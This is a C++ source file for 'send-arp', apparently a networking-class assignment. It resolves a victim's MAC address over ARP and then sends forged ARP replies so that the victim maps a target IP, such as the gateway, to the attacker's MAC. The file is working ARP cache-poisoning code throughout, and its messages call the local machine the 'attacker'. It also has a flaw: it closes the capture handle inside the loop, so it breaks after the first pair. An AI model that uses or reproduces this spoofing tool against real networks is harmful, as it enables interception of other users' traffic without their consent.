#include "main.h"

int get_my_ip(char* dev, uint8_t* my_ip){
    struct ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    char buf[20];
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if(ioctl(s, SIOCGIFADDR, &ifr) < 0){
        return FAIL;
    }
    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, buf, sizeof(struct sockaddr));
    Ip(my_ip, buf);
    close(s);
    return SUCCESS;
}

int get_my_mac(uint8_t *my_mac){
    struct ifreq ifr;
    struct ifconf ifc;
    char buf[1024];
    int success = 0;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1){
        return FAIL;
    };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) {
        close(sock);
        return FAIL;
    }

    struct ifreq* it = ifc.ifc_req;
    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

    for (; it != end; ++it) {
        strcpy(ifr.ifr_name, it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;
                }
            }
        }
        else {
            close(sock);
            return FAIL;
        }
    }

    if (success){
        memcpy(my_mac, ifr.ifr_hwaddr.sa_data, MAC_SIZE);
        printf("[+] attacker mac addr: %02x:%02x:%02x:%02x:%02x:%02x\n", my_mac[0],my_mac[1],my_mac[2],my_mac[3],my_mac[4],my_mac[5]);
        close(sock);
        return SUCCESS;
    }
    else{
        close(sock);
        return FAIL;
    }
}


void usage(void){
    puts("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]");
    puts("sample : send-arp ens33 172.30.1.31 172.30.1.254");
}

pcap_t *handle = NULL;
ARP_PK packet;

void send_arp(uint8_t* my_ip, uint8_t* my_mac, uint8_t* your_ip, uint8_t* your_mac, uint8_t op){
    if(op == ARPOP_REQUEST){
        Mac(packet.eth.ether_dhost, "ff:ff:ff:ff:ff:ff");
        Mac(packet.arp_.tmac_addr, "00:00:00:00:00:00");
    }
    else{
        memcpy(packet.eth.ether_dhost, your_mac, MAC_SIZE);
        memcpy(packet.arp_.tmac_addr, your_mac, MAC_SIZE);
    }
    memcpy(packet.eth.ether_shost, my_mac, MAC_SIZE);
    packet.eth.ether_type = htons(ETHERTYPE_ARP);

    packet.arp.ar_hrd = htons(ARPHRD_ETHER);
    packet.arp.ar_pro = htons(PROTO_IPv4);
    packet.arp.ar_hln = MAC_SIZE;
    packet.arp.ar_pln = IP_SIZE;
    packet.arp.ar_op = htons(op);

    memcpy(packet.arp_.smac_addr, my_mac, MAC_SIZE);
    memcpy(packet.arp_.sip_addr, my_ip, IP_SIZE);
    memcpy(packet.arp_.tip_addr, your_ip, IP_SIZE);
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(ARP_PK));
    
    if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}


int get_your_mac(uint8_t* my_ip, uint8_t* my_mac, uint8_t* your_ip, uint8_t* your_mac){
    while(true){
        send_arp(my_ip, my_mac, your_ip, your_mac, ARPOP_REQUEST);
        struct pcap_pkthdr* header;
        const u_char* ar_packet;
        int res = pcap_next_ex(handle, &header, &ar_packet);
        if(res == 0) continue;
        if(res == -1 || res == -2){
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return FAIL;
        }
        if(header->caplen < sizeof(ARP_PK))
            continue;

        ARP_PK rep_packet;
        ARP_PK req_packet;

        memcpy(&rep_packet, ar_packet, (size_t)sizeof(ARP_PK));
        memcpy(&req_packet, reinterpret_cast<const u_char*>(&packet), (size_t)sizeof(ARP_PK));

        if(ip_eq(rep_packet.arp_.sip_addr, req_packet.arp_.tip_addr)
        && ip_eq(rep_packet.arp_.tip_addr, req_packet.arp_.sip_addr)
        && mac_eq(rep_packet.arp_.tmac_addr, req_packet.arp_.smac_addr)){
            memcpy(your_mac, rep_packet.arp_.smac_addr, MAC_SIZE);
            printf("[+] sender mac addr: %02x:%02x:%02x:%02x:%02x:%02x\n", your_mac[0],your_mac[1],your_mac[2],your_mac[3],your_mac[4],your_mac[5]);
            return SUCCESS;
        }
        else
            continue;
    }
}   

int main(int argc, char* argv[]){
    if(argc < 4 || argc % 2 != 0){
        usage();
        return FAIL;
    }

    char* dev = argv[1];
    char err_buf[PCAP_ERRBUF_SIZE] = { 0 };
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, err_buf);
    if(handle == nullptr){
        fprintf(stderr, "couldn't open device(%s)(%s)\n", dev, err_buf);
        return FAIL;
    }

    uint8_t my_ip[4] = { 0 };
    if(get_my_ip(dev, my_ip) != SUCCESS){
        fprintf(stderr, "couldn't get attacker ip adddress\n");
        return FAIL;
    }
    printf("[+] attacker ip addr: %d.%d.%d.%d\n", my_ip[0], my_ip[1], my_ip[2], my_ip[3]);
    uint8_t my_mac[6] = { 0 };
    if(get_my_mac(my_mac) != SUCCESS){
        fprintf(stderr, "couldn't get attacker mac address\n");
        return FAIL;
    }
    
    for(int i=1;i<argc/2;i++){
        uint8_t s_ip[4] = { 0 };
        Ip(s_ip, argv[2*i]);
        printf("[+] sender ip addr: %d.%d.%d.%d\n", s_ip[0], s_ip[1], s_ip[2], s_ip[3]);

        uint8_t your_mac[6] = { 0 };
        if(get_your_mac(my_ip, my_mac, s_ip, your_mac) != SUCCESS){
            fprintf(stderr, "couldn't get sender mac address\n");
        }

        uint8_t t_ip[4] = { 0 };
        Ip(t_ip, argv[2*i+1]);
        printf("[+] target ip addr: %d.%d.%d.%d\n", t_ip[0], t_ip[1], t_ip[2], t_ip[3]);

        send_arp(t_ip, my_mac, s_ip, your_mac, ARPOP_REPLY);
        pcap_close(handle);
    }
}